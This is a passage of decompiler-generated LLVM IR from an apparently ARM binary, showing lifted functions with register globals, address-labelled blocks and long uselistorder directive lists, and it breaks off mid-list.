dec_label_pc_1588c:                               ; preds = %dec_label_pc_158a8, %dec_label_pc_15880
  %v0_1588c = load i32, i32* @r4, align 4
  %v1_1588c = inttoptr i32 %v0_1588c to i16*
  %v2_1588c = load i16, i16* %v1_1588c, align 2
  %v3_1588c = zext i16 %v2_1588c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15894 = or i32 %v3_1588c, 8
  store i32 %v1_15894, i32* %r3.global-to-local, align 4
  %v1_15898 = trunc i32 %v1_15894 to i16
  store i16 %v1_15898, i16* %v1_1588c, align 2
  %v1_158e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158d8

dec_label_pc_158a0:                               ; preds = %dec_label_pc_15874
  %v1_158a0 = and i32 %v3_15874, 64
  %v2_158a0 = icmp eq i32 %v1_158a0, 0
  br i1 %v2_158a0, label %dec_label_pc_158c8, label %dec_label_pc_158a8

dec_label_pc_158a8:                               ; preds = %dec_label_pc_158a0
  %v0_158a8 = load i32, i32* @r0, align 4
  %v1_158a8 = call i32 @function_14480(i32 %v0_158a8)
  store i32 %v1_158a8, i32* %r0.global-to-local, align 4
  %v2_158ac = icmp eq i32 %v1_158a8, 0
  br i1 %v2_158ac, label %dec_label_pc_158b4, label %dec_label_pc_1588c

dec_label_pc_158b4:                               ; preds = %dec_label_pc_158a8
  %v0_158b4 = load i32, i32* @r4, align 4
  %v1_158b4 = inttoptr i32 %v0_158b4 to i16*
  %v2_158b4 = load i16, i16* %v1_158b4, align 2
  %v3_158b4 = zext i16 %v2_158b4 to i32
  store i32 %v3_158b4, i32* %r3.global-to-local, align 4
  %v1_158b8 = add i32 %v0_158b4, 8
  %v2_158b8 = inttoptr i32 %v1_158b8 to i32*
  %v3_158b8 = load i32, i32* %v2_158b8, align 4
  %v1_158bc = and i32 %v3_158b4, 65471
  store i32 %v1_158bc, i32* %r3.global-to-local, align 4
  %v2_158c0 = add i32 %v0_158b4, 28
  %v3_158c0 = inttoptr i32 %v2_158c0 to i32*
  store i32 %v3_158b8, i32* %v3_158c0, align 4
  %v0_158c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_158c4 = trunc i32 %v0_158c4 to i16
  %v2_158c4 = load i32, i32* @r4, align 4
  %v3_158c4 = inttoptr i32 %v2_158c4 to i16*
  store i16 %v1_158c4, i16* %v3_158c4, align 2
  %v0_158c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %dec_label_pc_158a0, %dec_label_pc_158b4
  %v2_158d0 = phi i32 [ %v0_15874, %dec_label_pc_158a0 ], [ %v0_158c8.pre, %dec_label_pc_158b4 ]
  %v1_158c8 = inttoptr i32 %v2_158d0 to i16*
  %v2_158c8 = load i16, i16* %v1_158c8, align 2
  %v3_158c8 = zext i16 %v2_158c8 to i32
  %v1_158cc = or i32 %v3_158c8, 1
  store i32 %v1_158cc, i32* %r3.global-to-local, align 4
  %v1_158d0 = trunc i32 %v1_158cc to i16
  store i16 %v1_158d0, i16* %v1_158c8, align 2
  %v0_158d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_158d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158d8

dec_label_pc_158d8:                               ; preds = %dec_label_pc_1588c, %dec_label_pc_158c8
  %v1_158e0 = phi i32 [ %v1_158e0.pre, %dec_label_pc_1588c ], [ %v0_158d4, %dec_label_pc_158c8 ]
  %v2_158dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_158dc, i32* @r4, align 4
  ret i32 %v1_158e0

; uselistorder directives
  uselistorder i32 %v3_15850, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 10, 22, 0, 11, 12, 13, 16, 17, 8, 2, 9, 3, 4, 5, 6, 19, 20, 21, 1, 7, 14, 15, 18 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_14480, { 2, 1, 0 }
  uselistorder i32 64, { 13, 14, 15, 16, 19, 9, 10, 11, 12, 42, 8, 5, 17, 6, 18, 20, 21, 0, 22, 23, 24, 7, 25, 26, 27, 1, 28, 29, 30, 2, 31, 32, 33, 34, 35, 3, 36, 37, 38, 39, 40, 4, 41 }
  uselistorder i32 8, { 81, 82, 83, 84, 85, 86, 87, 74, 75, 76, 77, 160, 88, 218, 42, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 89, 90, 91, 92, 93, 94, 95, 30, 96, 97, 98, 99, 100, 101, 102, 103, 104, 78, 79, 80, 111, 112, 113, 57, 236, 237, 238, 33, 163, 164, 165, 166, 167, 168, 169, 170, 6, 63, 171, 172, 173, 174, 175, 176, 177, 178, 7, 144, 145, 146, 147, 148, 149, 150, 151, 179, 180, 181, 182, 183, 8, 184, 185, 9, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 203, 196, 197, 198, 199, 64, 26, 200, 201, 202, 65, 66, 10, 204, 205, 206, 207, 209, 210, 67, 11, 211, 12, 208, 45, 46, 43, 44, 27, 28, 40, 41, 47, 239, 114, 115, 116, 117, 58, 70, 34, 13, 14, 24, 15, 69, 35, 16, 17, 25, 18, 59, 105, 106, 19, 20, 21, 108, 109, 60, 110, 22, 107, 118, 119, 120, 121, 3, 122, 123, 124, 4, 125, 126, 127, 128, 129, 130, 131, 5, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 48, 152, 49, 153, 50, 154, 51, 155, 52, 156, 53, 157, 54, 158, 61, 159, 0, 1, 68, 23, 161, 62, 162, 2, 31, 36, 37, 32, 38, 39, 212, 71, 72, 213, 214, 215, 55, 216, 29, 73, 56, 217 }
  uselistorder i32 9, { 5, 18, 16, 17, 36, 38, 6, 26, 3, 39, 7, 19, 20, 21, 22, 2, 8, 23, 24, 9, 25, 0, 10, 11, 12, 13, 1, 14, 33, 27, 28, 29, 30, 31, 32, 34, 35, 37, 15, 40, 41, 4, 42 }
  uselistorder i32 16, { 96, 97, 98, 90, 91, 92, 93, 99, 32, 33, 34, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 100, 101, 102, 103, 104, 2, 1, 26, 47, 48, 49, 50, 107, 51, 108, 105, 106, 52, 53, 109, 9, 54, 55, 110, 111, 56, 57, 112, 113, 94, 95, 58, 124, 125, 86, 87, 88, 89, 59, 27, 122, 35, 60, 61, 62, 188, 189, 190, 191, 63, 193, 3, 64, 194, 195, 0, 196, 197, 65, 25, 126, 66, 127, 67, 68, 10, 23, 11, 12, 4, 13, 14, 15, 24, 16, 17, 5, 18, 19, 69, 117, 70, 114, 115, 71, 120, 36, 121, 116, 37, 118, 40, 39, 38, 119, 41, 72, 73, 74, 75, 76, 77, 123, 42, 173, 128, 129, 28, 130, 131, 132, 133, 78, 43, 134, 135, 29, 136, 137, 20, 138, 139, 6, 79, 140, 141, 142, 30, 143, 144, 145, 146, 147, 7, 80, 148, 31, 149, 150, 151, 21, 152, 153, 84, 22, 85, 154, 81, 82, 155, 156, 8, 45, 157, 44, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 170, 169, 171, 172, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 185, 184, 186, 187, 192, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 83, 208, 209, 210, 211, 46, 212, 213, 214, 215, 216 }
  uselistorder i32* @r1, { 13, 12, 47, 14, 15, 16, 17, 1, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 2, 98, 99, 18, 19, 20, 21, 0, 32, 33, 9, 22, 28, 29, 30, 3, 49, 45, 46, 4, 50, 5, 24, 25, 8, 48, 23, 34, 10, 51, 11, 52, 53, 54, 7, 55, 26, 27, 31, 35, 36, 42, 43, 6, 37, 38, 39, 40, 41, 44, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder label %dec_label_pc_158d8, { 1, 0 }
  uselistorder label %dec_label_pc_158c8, { 1, 0 }
  uselistorder label %dec_label_pc_15880, { 1, 0 }
  uselistorder label %dec_label_pc_15874, { 1, 0 }
}

define i32 @function_158e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_158e4:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_158e4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_158f4 = call i32 @function_10b30()
  %v0_158f8 = load i32, i32* @r5, align 4
  %v1_158f8 = load i32, i32* @r4, align 4
  %v2_158f8 = add i32 %v1_158f8, %v0_158f8
  store i32 %v6_158e4, i32* @r5, align 4
  ret i32 %v2_158f8

; uselistorder directives
  uselistorder i32 ()* @function_10b30, { 7, 8, 6, 1, 3, 2, 5, 4, 0 }
  uselistorder i32* @r5, { 44, 45, 46, 47, 30, 31, 32, 33, 34, 35, 36, 37, 38, 48, 4, 49, 50, 51, 671, 672, 673, 52, 26, 53, 0, 54, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 22, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 28, 29, 77, 78, 79, 80, 81, 82, 5, 83, 84, 85, 86, 87, 88, 89, 6, 90, 91, 92, 9, 93, 94, 7, 95, 96, 97, 98, 99, 100, 8, 101, 102, 103, 104, 105, 106, 39, 10, 40, 41, 42, 43, 274, 275, 276, 277, 278, 279, 686, 11, 687, 688, 696, 107, 108, 109, 110, 111, 112, 113, 689, 690, 691, 692, 693, 694, 695, 114, 115, 116, 117, 550, 551, 555, 556, 557, 558, 559, 552, 553, 554, 504, 505, 506, 12, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 560, 561, 584, 13, 585, 586, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 2, 575, 576, 577, 578, 579, 14, 580, 581, 582, 583, 218, 219, 220, 221, 222, 280, 281, 15, 282, 283, 284, 285, 286, 27, 118, 287, 16, 288, 289, 290, 291, 292, 293, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 217, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 1, 273, 294, 295, 296, 297, 298, 23, 299, 300, 301, 302, 303, 304, 305, 24, 306, 25, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 3, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 587, 588, 549, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 17, 615, 616, 617, 18, 618, 619, 19, 620, 621, 20, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 642, 641, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 21, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670 }
  uselistorder i32* @r2, { 8, 11, 12, 49, 50, 13, 14, 15, 16, 17, 18, 27, 9, 10, 28, 51, 55, 56, 57, 58, 2, 61, 24, 25, 52, 3, 4, 32, 33, 5, 34, 6, 19, 20, 0, 21, 1, 59, 7, 60, 53, 54, 35, 36, 37, 38, 39, 40, 41, 22, 23, 26, 29, 30, 31, 42, 43, 44, 45, 46, 47, 48 }
}

define i32 @function_15908(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15908:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15948, label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_15908
  %v0_15934 = call i32 @function_10a30()
  %v0_15938 = load i32, i32* %r4.global-to-local, align 4
  %v1_15938 = sub i32 0, %v0_15938
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15940 = inttoptr i32 %v0_15934 to i32*
  store i32 %v1_15938, i32* %v2_15940, align 4
  %v0_15950.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15950

dec_label_pc_15948:                               ; preds = %dec_label_pc_15908
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_15948 = icmp eq i32 %arg1, 0
  br i1 %v2_15948, label %dec_label_pc_1595c, label %dec_label_pc_15950

dec_label_pc_15950:                               ; preds = %dec_label_pc_15948, %dec_label_pc_15934
  %v0_15950 = phi i32 [ %arg1, %dec_label_pc_15948 ], [ %v0_15950.pre, %dec_label_pc_15934 ]
  br label %dec_label_pc_15960

dec_label_pc_1595c:                               ; preds = %dec_label_pc_15948
  br label %dec_label_pc_15960

dec_label_pc_15960:                               ; preds = %dec_label_pc_15950, %dec_label_pc_1595c
  %v1_15968 = phi i32 [ %v0_15950, %dec_label_pc_15950 ], [ %tmp8, %dec_label_pc_1595c ]
  ret i32 %v1_15968

; uselistorder directives
  uselistorder i32 -1, { 254, 260, 180, 255, 256, 257, 116, 258, 117, 259, 94, 95, 96, 97, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 181, 182, 0, 183, 155, 261, 262, 184, 118, 263, 185, 1, 98, 264, 265, 162, 266, 186, 3, 2, 187, 188, 119, 340, 120, 121, 298, 122, 299, 115, 300, 286, 287, 288, 123, 253, 124, 301, 302, 4, 189, 190, 191, 303, 282, 283, 163, 192, 5, 193, 6, 194, 164, 304, 10, 195, 196, 9, 11, 305, 8, 197, 198, 99, 7, 199, 100, 101, 102, 103, 200, 201, 202, 109, 267, 268, 12, 269, 125, 306, 126, 127, 296, 128, 307, 129, 295, 130, 308, 131, 284, 132, 133, 270, 134, 309, 135, 294, 136, 271, 114, 179, 13, 290, 203, 137, 310, 138, 342, 139, 272, 140, 273, 141, 274, 142, 289, 143, 344, 144, 311, 145, 341, 146, 291, 147, 292, 148, 275, 149, 312, 150, 151, 152, 343, 153, 285, 204, 205, 206, 207, 14, 15, 107, 112, 16, 17, 313, 113, 108, 160, 161, 208, 209, 111, 18, 19, 20, 21, 22, 154, 280, 281, 110, 210, 165, 276, 166, 277, 24, 167, 278, 23, 25, 26, 27, 168, 279, 28, 29, 30, 31, 32, 104, 211, 33, 34, 35, 212, 213, 214, 215, 36, 156, 157, 158, 159, 37, 38, 39, 216, 40, 41, 42, 43, 105, 44, 45, 46, 47, 48, 169, 293, 49, 50, 51, 217, 52, 218, 53, 54, 55, 219, 56, 57, 58, 220, 59, 60, 61, 62, 63, 221, 64, 65, 66, 222, 67, 68, 223, 224, 297, 69, 106, 314, 315, 176, 316, 225, 72, 226, 73, 227, 74, 228, 175, 317, 174, 318, 92, 229, 75, 230, 76, 231, 171, 319, 177, 320, 232, 77, 233, 78, 234, 79, 235, 80, 236, 81, 237, 82, 238, 83, 239, 84, 240, 85, 241, 86, 242, 87, 243, 173, 321, 89, 244, 90, 245, 88, 246, 91, 247, 170, 322, 248, 93, 249, 250, 70, 251, 71, 252, 172, 323, 178, 324 }
  uselistorder i32 ()* @function_10a30, { 65, 61, 64, 63, 62, 67, 60, 59, 5, 4, 28, 24, 23, 40, 39, 66, 22, 21, 20, 44, 43, 27, 17, 19, 18, 56, 55, 16, 15, 29, 14, 30, 13, 42, 12, 54, 11, 31, 53, 58, 57, 38, 36, 35, 34, 10, 2, 52, 51, 50, 37, 0, 9, 3, 33, 32, 49, 8, 25, 48, 1, 41, 47, 46, 45, 26, 7, 6 }
  uselistorder i32 1, { 202, 201, 780, 603, 405, 406, 407, 604, 211, 781, 782, 783, 605, 70, 72, 71, 73, 68, 75, 69, 74, 606, 277, 276, 275, 607, 144, 145, 142, 148, 146, 143, 147, 608, 210, 233, 232, 439, 480, 440, 950, 951, 952, 953, 458, 404, 610, 609, 380, 381, 784, 611, 445, 1082, 446, 785, 1083, 786, 787, 788, 790, 789, 428, 612, 792, 791, 884, 885, 1084, 447, 1085, 1086, 1087, 1088, 1089, 1090, 777, 1091, 1092, 1093, 1094, 1095, 1096, 778, 596, 614, 613, 395, 396, 401, 403, 402, 397, 394, 398, 400, 399, 796, 793, 794, 795, 478, 448, 65, 61, 62, 63, 64, 511, 797, 798, 799, 800, 615, 597, 235, 234, 801, 618, 617, 616, 282, 285, 283, 286, 287, 288, 284, 512, 802, 620, 619, 385, 384, 382, 383, 386, 387, 803, 621, 194, 193, 192, 804, 805, 622, 223, 222, 623, 345, 513, 779, 297, 298, 806, 807, 808, 809, 514, 810, 811, 812, 449, 626, 625, 624, 389, 388, 393, 391, 390, 392, 813, 814, 815, 628, 627, 299, 300, 515, 816, 629, 159, 817, 818, 819, 820, 821, 516, 630, 105, 108, 107, 106, 109, 517, 110, 224, 631, 167, 166, 338, 632, 203, 633, 327, 326, 634, 126, 131, 125, 130, 134, 133, 129, 132, 127, 128, 635, 141, 140, 138, 137, 139, 135, 136, 636, 84, 85, 92, 93, 89, 90, 88, 91, 86, 87, 637, 123, 124, 410, 886, 250, 253, 251, 252, 638, 247, 246, 639, 204, 640, 155, 156, 1097, 518, 1098, 519, 641, 80, 76, 81, 79, 77, 82, 83, 78, 263, 520, 170, 169, 642, 408, 409, 111, 435, 822, 823, 824, 643, 965, 646, 645, 644, 154, 647, 441, 870, 442, 871, 872, 436, 873, 412, 413, 411, 414, 415, 418, 417, 416, 874, 1099, 459, 521, 649, 648, 650, 279, 966, 969, 970, 971, 651, 346, 351, 352, 350, 349, 353, 347, 348, 972, 973, 974, 975, 652, 359, 365, 358, 364, 363, 357, 367, 366, 361, 355, 360, 356, 362, 967, 968, 522, 216, 215, 214, 217, 943, 523, 944, 945, 946, 947, 948, 653, 162, 163, 161, 164, 199, 198, 976, 977, 978, 979, 980, 981, 485, 982, 983, 984, 985, 986, 987, 988, 989, 525, 990, 991, 992, 993, 994, 524, 995, 996, 997, 998, 999, 654, 370, 372, 368, 371, 376, 378, 375, 377, 379, 373, 374, 369, 102, 101, 526, 527, 438, 658, 657, 656, 655, 66, 450, 249, 659, 100, 99, 311, 660, 248, 661, 212, 662, 200, 663, 213, 664, 96, 95, 153, 665, 181, 180, 666, 227, 667, 309, 308, 668, 310, 669, 825, 826, 827, 828, 829, 830, 831, 1100, 23, 24, 25, 26, 670, 887, 528, 18, 19, 832, 671, 94, 529, 672, 165, 486, 530, 673, 207, 205, 206, 674, 22, 21, 20, 675, 191, 190, 676, 168, 677, 290, 678, 226, 225, 679, 209, 208, 221, 220, 680, 158, 157, 681, 98, 97, 682, 236, 683, 273, 272, 684, 313, 312, 685, 289, 337, 686, 354, 280, 687, 688, 160, 689, 104, 103, 1000, 420, 1001, 421, 1002, 419, 1003, 1004, 1005, 1006, 434, 1007, 691, 690, 10, 17, 15, 13, 14, 11, 12, 16, 422, 443, 1008, 1009, 1010, 1011, 8, 7, 0, 1012, 1013, 1014, 1015, 1016, 451, 1017, 452, 1018, 693, 692, 196, 195, 197, 888, 889, 890, 694, 257, 256, 254, 255, 1019, 1020, 1021, 444, 460, 1, 431, 510, 1022, 150, 149, 151, 152, 1023, 1024, 1025, 531, 1026, 278, 955, 1028, 1027, 1029, 60, 1030, 67, 1031, 695, 294, 293, 292, 291, 295, 1032, 696, 178, 177, 176, 175, 179, 843, 844, 845, 846, 847, 848, 849, 423, 433, 850, 851, 461, 424, 852, 853, 854, 855, 425, 432, 856, 857, 462, 426, 858, 532, 859, 860, 533, 861, 534, 862, 863, 453, 866, 864, 865, 429, 430, 867, 535, 868, 704, 599, 703, 702, 701, 700, 699, 698, 598, 697, 267, 268, 269, 264, 271, 266, 265, 270, 705, 274, 935, 473, 454, 706, 35, 34, 33, 32, 36, 30, 28, 27, 29, 31, 833, 834, 835, 836, 536, 708, 707, 47, 48, 57, 58, 45, 49, 46, 50, 51, 52, 59, 43, 44, 53, 54, 56, 55, 325, 490, 837, 539, 838, 489, 839, 537, 538, 540, 840, 841, 541, 542, 543, 427, 544, 545, 546, 487, 842, 547, 725, 724, 723, 722, 721, 720, 719, 718, 717, 716, 715, 714, 713, 712, 711, 600, 710, 709, 37, 38, 39, 41, 40, 42, 550, 549, 548, 869, 727, 726, 218, 219, 551, 875, 477, 876, 476, 877, 475, 878, 474, 879, 880, 552, 479, 553, 881, 554, 882, 555, 883, 437, 556, 739, 738, 737, 736, 735, 734, 733, 732, 731, 730, 729, 728, 228, 230, 229, 231, 891, 897, 3, 463, 892, 557, 893, 2, 894, 481, 895, 464, 465, 896, 898, 899, 482, 900, 601, 743, 742, 602, 741, 740, 174, 936, 491, 492, 937, 4, 5, 6, 901, 902, 903, 558, 559, 745, 744, 340, 343, 342, 339, 344, 341, 904, 905, 560, 906, 493, 466, 561, 746, 171, 172, 173, 907, 908, 909, 562, 910, 563, 564, 911, 494, 912, 747, 183, 187, 188, 189, 186, 182, 185, 184, 913, 914, 915, 565, 916, 566, 496, 495, 567, 917, 568, 918, 748, 240, 243, 244, 245, 242, 237, 241, 238, 239, 919, 920, 921, 922, 923, 569, 924, 570, 925, 571, 501, 500, 572, 926, 497, 927, 498, 928, 499, 929, 754, 753, 752, 751, 750, 749, 304, 305, 307, 306, 301, 303, 302, 930, 931, 932, 573, 504, 503, 574, 933, 502, 934, 755, 120, 117, 119, 122, 121, 116, 115, 118, 938, 939, 940, 575, 507, 506, 576, 941, 505, 942, 760, 759, 758, 757, 756, 328, 329, 334, 335, 336, 333, 332, 331, 330, 949, 577, 113, 112, 114, 1033, 761, 281, 954, 9, 956, 959, 578, 960, 961, 957, 958, 962, 963, 258, 259, 260, 262, 261, 964, 579, 762, 1034, 296, 1035, 585, 1036, 1037, 583, 1038, 584, 1039, 1040, 588, 1041, 1042, 484, 586, 1043, 587, 1044, 1045, 509, 1046, 1047, 469, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 456, 1055, 589, 1056, 590, 591, 1057, 1058, 1059, 1060, 470, 1061, 1062, 471, 1063, 1064, 472, 1065, 457, 468, 467, 1066, 1067, 582, 1068, 1069, 580, 1070, 455, 581, 508, 1071, 1073, 1074, 1072, 592, 1075, 593, 1076, 594, 1077, 1078, 776, 488, 1079, 1080, 483, 595, 1081, 774, 773, 772, 771, 770, 769, 768, 767, 766, 765, 764, 763, 315, 316, 317, 320, 319, 318, 324, 321, 314, 322, 323, 775 }
  uselistorder i32 %arg1, { 1, 3, 4, 0, 2 }
  uselistorder label %dec_label_pc_15960, { 1, 0 }
}

define i32 @function_1596c() local_unnamed_addr {
entry:
  %v3_15970 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_15970)
  %v31_15978 = load i32, i32* @r0, align 4
  ret i32 %v31_15978

; uselistorder directives
  uselistorder i32* @r0, { 30, 18, 25, 56, 55, 187, 17, 4, 5, 264, 6, 14, 7, 57, 0, 58, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 1, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 59, 21, 53, 54, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 29, 10, 152, 153, 9, 12, 20, 291, 293, 294, 45, 46, 47, 48, 49, 50, 51, 52, 19, 26, 74, 75, 292, 139, 140, 76, 197, 13, 43, 44, 198, 2, 199, 200, 201, 196, 181, 39, 182, 183, 184, 40, 185, 186, 15, 209, 210, 202, 203, 204, 205, 206, 207, 208, 129, 130, 24, 131, 8, 16, 154, 155, 156, 157, 190, 22, 11, 27, 211, 28, 212, 213, 214, 215, 216, 217, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 137, 138, 132, 32, 33, 133, 34, 134, 135, 136, 35, 36, 141, 142, 143, 144, 145, 146, 147, 148, 149, 37, 150, 151, 38, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 177, 178, 3, 170, 171, 172, 173, 174, 175, 176, 179, 180, 188, 189, 41, 42, 23, 191, 192, 193, 218, 194, 219, 195, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 31 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 60, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 65, 66, 67, 68, 61, 49, 62, 63, 64, 69, 70, 71, 50, 51, 52, 45, 46, 47, 53, 57, 58, 54, 55, 56, 72, 39, 40, 41, 42, 43, 44, 38, 48, 59 }
  uselistorder i32 0, { 562, 563, 572, 573, 574, 575, 576, 96, 577, 578, 579, 0, 580, 277, 59, 581, 342, 582, 583, 584, 309, 310, 564, 565, 570, 1, 97, 98, 901, 902, 903, 904, 133, 134, 905, 585, 135, 99, 1136, 1137, 1138, 278, 586, 587, 588, 279, 1139, 60, 280, 1140, 1141, 77, 39, 40, 589, 67, 2, 91, 92, 737, 68, 69, 70, 738, 739, 1142, 1143, 1144, 1145, 1146, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1147, 1148, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 30, 1167, 1168, 1169, 1170, 1171, 31, 1172, 1173, 1174, 32, 1175, 1176, 1177, 33, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1202, 1203, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 34, 1221, 1222, 1223, 1224, 1225, 35, 1226, 1227, 1228, 1229, 1230, 36, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 136, 590, 535, 591, 592, 593, 594, 595, 343, 344, 596, 597, 100, 101, 102, 598, 599, 603, 600, 601, 602, 281, 296, 604, 605, 103, 137, 608, 606, 607, 282, 609, 104, 610, 611, 3, 4, 105, 612, 556, 557, 345, 558, 613, 614, 615, 61, 62, 616, 617, 618, 138, 619, 620, 621, 622, 623, 346, 624, 625, 626, 627, 628, 629, 106, 630, 631, 632, 633, 5, 6, 139, 141, 634, 140, 635, 142, 636, 107, 637, 642, 643, 638, 639, 640, 645, 646, 647, 143, 648, 649, 650, 651, 652, 641, 644, 653, 108, 566, 567, 568, 1246, 1247, 894, 925, 926, 571, 740, 741, 311, 742, 347, 559, 348, 560, 927, 928, 929, 144, 930, 743, 744, 745, 561, 569, 109, 145, 1248, 1249, 931, 932, 349, 1253, 1254, 350, 1255, 1256, 146, 284, 1257, 1258, 351, 63, 1259, 1260, 352, 1267, 1270, 518, 283, 1271, 353, 1268, 1269, 1250, 1251, 536, 147, 272, 654, 656, 655, 148, 657, 658, 659, 354, 660, 93, 933, 84, 934, 150, 149, 935, 110, 1252, 713, 714, 715, 716, 717, 718, 152, 111, 719, 720, 721, 85, 151, 722, 112, 356, 357, 1262, 355, 113, 534, 114, 153, 